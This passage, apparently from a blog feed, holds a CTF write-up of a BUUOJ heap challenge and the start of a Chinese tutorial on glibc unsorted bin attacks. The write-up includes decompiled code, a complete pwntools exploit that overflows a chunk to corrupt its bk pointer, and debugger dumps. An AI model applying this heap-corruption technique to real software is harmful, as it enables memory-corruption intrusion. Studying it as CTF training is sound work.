function_">create_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (heap *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>      {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入大小，创建相应大小的堆</p><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v2 = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[v1], v2);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>重新输入大小，更新内容，大小由我们定，存在堆溢出哦！！！</p><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">free</span>(heaparray[v1]);<br>    heaparray[v1] = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure><p>正常free操作，指针清0，不存在uaf</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./magicheap'</span>)<br>p = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">29691</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>heap_ptr = <span class="hljs-number">0x6020E0</span><br>magic = <span class="hljs-number">0x6020C0</span><br>goal = magic - <span class="hljs-number">0x10</span><br><br><span class="hljs-comment"># 申请一个small chunk</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)   <span class="hljs-comment">#chunk0</span><br><span class="hljs-comment"># 申请一个chunk1防 chunk0 合并</span><br>create(<span class="hljs-number">500</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x421</span>) + p64(<span class="hljs-number">0</span>) + p64(goal)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">"666"</span>)<br><span class="hljs-comment">#debug()</span><br>p.sendline(<span class="hljs-string">"4869"</span>)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h3 id="创建两个chunk"><a href="#创建两个chunk" class="headerlink" title="创建两个chunk"></a>创建两个chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><span class="hljs-comment">//chunk0</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x000000000000000a</span> <br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><span class="hljs-comment">//chunk1</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x6262626262626262</span><span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure><p>申请的 chunk(500) 以防止合并</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65440</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000201</span><span class="hljs-comment">//chunk3</span><br><span class="hljs-number">0x1a65450</span>:<span class="hljs-number">0x6363636363636363</span><span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure><h3 id="free掉small-chunk，被放入到-unsorted-bin-中"><a href="#free掉small-chunk，被放入到-unsorted-bin-中" class="headerlink" title="free掉small chunk，被放入到 unsorted bin 中"></a>free掉small chunk，被放入到 unsorted bin 中</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x000000000000000a</span><br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x00007f9bd595bb78</span><span class="hljs-number">0x00007f9bd595bb78</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all: <span class="hljs-number">0x1a65020</span> —▸ <span class="hljs-number">0x7f9bd595bb78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x1a65020</span><br></code></pre></td></tr></tbody></table></figure><p>被放入unsorted bin 中</p><p>观察全局变量</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020e0</span> &lt;heaparray&gt;:<span class="hljs-number">0x0000000001a65010</span><span class="hljs-number">0x0000000000000000</span><br>    #chunk1已经被<span class="hljs-built_in">free</span>掉<br><span class="hljs-number">0x6020f0</span> &lt;heaparray+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000001a65450</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h3 id="溢出到目的位置"><a href="#溢出到目的位置" class="headerlink" title="溢出到目的位置"></a>溢出到目的位置</h3><p>通过对chunk 0 进行溢出 修改 chunk1 的 bk 指针，到magic-0x10的位置</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x1a65000</span><br><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00000000006020b0</span> <span class="hljs-comment">// bk -&gt; magic - 0x10</span><br></code></pre></td></tr></tbody></table></figure><h3 id="再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk"><a href="#再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk" class="headerlink" title="再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk"></a>再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020b0</span> &lt;<span class="hljs-built_in">stdin</span>@@GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span>&gt;:<span class="hljs-number">0x00007f9bd595b8e0</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:<span class="hljs-number">0x00007f9bd595bb78</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><p>可以看到magic 已经被改成了0x00007f9bd595bb78，这个值是main_arena+88</p><p>最后我们输入 4869 就可以打印flag 了</p><p>flag{unsorted_bin_attack}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;unsortedbin-attack（例题）&quot;&gt;&lt;a href=&quot;#unsortedbin-attack（例题）&quot; class=&quot;headerlink&quot; title=&quot;unsortedbin_attack（例题）&quot;&gt;&lt;/a&gt;&lt;strong&gt;unsortedbin_</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="unsoted bin attack" scheme="https://kylinxin.github.io/tags/unsoted-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>unsorted bin</title>
    <link href="https://kylinxin.github.io/2023/09/14/unsorted%20bin%20attack/"/>
    <id>https://kylinxin.github.io/2023/09/14/unsorted%20bin%20attack/</id>
    <published>2023-09-14T01:58:29.000Z</published>
    <updated>2023-09-13T12:59:08.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于unsorted-bin-和-unsorted-bin-attack"><a href="#关于unsorted-bin-和-unsorted-bin-attack" class="headerlink" title="关于unsorted bin 和 unsorted bin attack"></a><strong>关于unsorted bin 和 unsorted bin attack</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如<strong>修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放</strong>，又或者<strong>修改_IO_list_all来伪造_IO_FILE进行攻击</strong>。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。</p><blockquote><p>global_max_fast是main_arena中控制最大fastbin大小的变量。</p></blockquote><h2 id="unsotedbin-基本来源"><a href="#unsotedbin-基本来源" class="headerlink" title="unsotedbin 基本来源"></a><strong>unsotedbin 基本来源</strong></h2><p>1、当一个较大的（在bin中的）chunk（由于malloc）被分割成两半之后，如果剩下的部分大于<strong>MINSIZE</strong>，就会被放到unsortedbin中。</p><blockquote><p>举个例子，如有个0x90大小的 small chunk，此时malloc(0x60)，剩下的0x30由于大于 MINSIZE ，会被放入unsortedbin 中</p></blockquote><p>2、释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。<br>3、当进行malloc_consolidate时，如果不是和top_chunk近邻的话，可能会把合并后的chunk放到unsortedbin中。</p><blockquote><p>consolidate是一个动词，其中文意思为：使加强; 使巩固; (使) 结成一体，<strong>合并</strong>;<br>因此malloc_consolidate的意思是堆中的碎片整理，目的是为了减少堆中的碎片。</p></blockquote><h2 id="unsortedbin-attack-概述"><a href="#unsortedbin-attack-概述" class="headerlink" title="unsortedbin_attack 概述"></a>unsortedbin_attack 概述</h2><p>● Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。<br>● Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 <strong>bk</strong> <strong>指针</strong>。</p><h2 id="unsortedbin-attack-效果"><a href="#unsortedbin-attack-效果" class="headerlink" title="unsortedbin_attack 效果"></a>unsortedbin_attack 效果</h2><p>● <strong>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。</strong></p><h2 id="unsortedbin-源码分析"><a href="#unsortedbin-源码分析" class="headerlink" title="unsortedbin 源码分析"></a>unsortedbin 源码分析</h2><blockquote><p>这里使用libc-2.23版本的源码<br>下面的源码不理解也没有关系（看看就好），这对利用unsortedbin这种攻击方式没有任何影响（）。<br>最重要的是最后的总结，记住就行了。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c">#源码的第<span class="hljs-number">3470</span>行<span class="hljs-number">-3597</span>行<br>         <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>#取链表尾部的chunk记作victim<br>        {<br>          bck = victim-&gt;bk;<br>          #倒数第二个chunk记作bck<br>          #接下来对victim的size位进行检查<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>  #检查通过，计算victim得到实际chunk的大小<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>              #假如说我们申请的<span class="hljs-built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是<br>              <span class="hljs-meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span><br>              <br>            {<br>              #假若满足条件则对其进行切割和解链操作<br>              <br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                {<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                }<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。<br>          #其中unsorted_chunks (av)-&gt;bk = bck;<br>          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br>          #是unsorted bin attack产生的原因，<br>          #一旦我们绕过之前的检查到达这里，<br>          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)<br>          #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。<br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          <span class="hljs-meta">#unsortedbin产生的原因：</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>  #<br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>      #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。<br>          <span class="hljs-keyword">if</span> (size == nb)<br>            {<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>                  <br>          <span class="hljs-comment">/* place chunk in bin */</span><br>  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，<br>          #需要根据其size放入small bin或large bin的链，<br>          #其中在后者实现中存在large bin attack，<br>          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            {<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            }<br>          <span class="hljs-keyword">else</span><br>            {<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                {<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) 